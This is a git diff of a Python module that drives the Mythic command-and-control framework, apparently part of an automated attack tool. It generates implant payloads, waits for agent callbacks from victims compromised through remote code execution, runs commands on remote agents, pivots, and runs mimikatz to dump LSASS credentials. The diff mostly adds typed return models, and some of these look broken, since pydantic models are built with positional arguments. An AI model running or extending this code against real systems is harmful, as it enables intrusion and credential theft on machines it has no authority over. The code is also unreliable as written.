@@ -4,18 +4,35 @@ to working with Mythic C2
 """
 import os
 import socket
-from typing import List
+from typing import List, Tuple
+from pydantic import BaseModel, UUID4
 
 from mythic import mythic
 from dotenv import load_dotenv
 # from app.core.config import get_settings
 
-
 mythic_instance = None
 load_dotenv()
 
 
-async def init_mythic():
+# for type check returns
+class AgentCommandOutput(BaseModel):
+    """ result of execute command on Agent"""
+    output: str
+    mythic_task_id: int
+    mythic_payload_id: int
+    mythic_payload_uuid: UUID4
+
+
+class NewPayloadOutput(BaseModel):
+    """ result of create new payload, log is from build """
+    payload_uuid: UUID4
+    payload_id: int
+    status: str
+    raw_log: str
+
+
+async def init_mythic() -> mythic.mythic_classes.Mythic:
     """ async get connect to mythic """
     global mythic_instance
     """
@@ -42,7 +59,7 @@ async def create_payload_d(
     lhost: str = "local",
     lport: int = 4329, os_type: str = "Windows",
     payload_type: str = "merlin"
-):
+) -> NewPayloadOutput:
     """ create payload and save, nt-merlin-http by default """
     if lhost == "local":
         # get lhost by ip of interface of open socket
@@ -79,7 +96,7 @@ async def create_payload_d(
     #                    'MYTHIC__SERVER_PORT')}/direct/download/{p_uuid}"
     status = payload_response["build_phase"]
     raw_log = payload_response["build_message"]
-    return p_uuid, p_id, status, raw_log
+    return NewPayloadOutput(p_uuid, p_id, status, raw_log)
 
 
 async def get_cmd_list_for_payload(
@@ -125,7 +142,7 @@ async def c2_pivoting_agent(lport, display_id, agent_type) -> str:
     return status
 
 
-async def get_agent_callback(rhost):
+async def get_agent_callback(rhost) -> Tuple[str, str, int]:
     """ get os, status, display_id of new callback,
         you must run payload after this func or with timeout """
     # payload is delivered and start by user cuz diversity of RCE
@@ -157,7 +174,7 @@ async def check_status(callback_display_id: int) -> str:
     return "fail"
 
 
-async def get_payload_ids(callback_display_id):
+async def get_payload_ids(callback_display_id) -> Tuple[int, UUID4]:
     """ get payload id and uuid from display id """
     global mythic_instance
     if mythic_instance is None:
@@ -184,7 +201,9 @@ async def get_payload_ids(callback_display_id):
     return 1, "00000000-0000-0000-0000-000000000000"
 
 
-async def execute_local_command(cmd, callback_display_id: int, timeout=500):
+async def execute_local_command(
+    cmd: str, callback_display_id: int, timeout: int = 500
+) -> AgentCommandOutput:
     """ async function to execute command on zero agent via shell agent
         and timeout, inside, there is a subscription to graphql event
         at the end of the task"""
@@ -203,30 +222,33 @@ async def execute_local_command(cmd, callback_display_id: int, timeout=500):
     mythic_t_id = callback_display_id
     mythic_p_id, mythic_p_uuid = await get_payload_ids(callback_display_id)
 
-    return str(output), mythic_t_id, mythic_p_id, mythic_p_uuid
+    return AgentCommandOutput(
+        str(output), mythic_t_id, mythic_p_id, mythic_p_uuid
+    )
 
 
 async def execute_agent_command_o(
     cmd: str, params: str, callback_display_id: int, timeout=300
-):
+) -> AgentCommandOutput:
     """ execute cmd with params on remote agent """
     output = await mythic.issue_task_and_waitfor_task_output(
         mythic=mythic_instance, command_name=cmd, parameters=params,
         callback_display_id=callback_display_id, timeout=timeout,
     )
     mythic_p_id, mythic_p_uuid = await get_payload_ids(callback_display_id)
+    return AgentCommandOutput(
+        str(output), 1, mythic_p_id, mythic_p_uuid
+    )
 
-    return str(output), mythic_p_id, mythic_p_uuid
 
-
-async def mimikatz_on_agent(display_id, agent_type):
+async def mimikatz_on_agent(display_id, agent_type) -> Tuple[str, int, UUID4]:
     """ run mimikatz from agent to dump LSASS, mostly for agent pivoting """
     if agent_type == "apollo":
-        raw_output, i, u = await execute_agent_command_o(
+        result: AgentCommandOutput = await execute_agent_command_o(
             cmd="mimikatz",
             params="""-Command "sekurlsa::minidump C:\\Temp\\ls.dmp" """
                    """ "sekurlsa::logonPasswords" """,
             callback_display_id=display_id
             )
         # todo extract and check hashes from dmp
-        return raw_output, i, u
+        return result
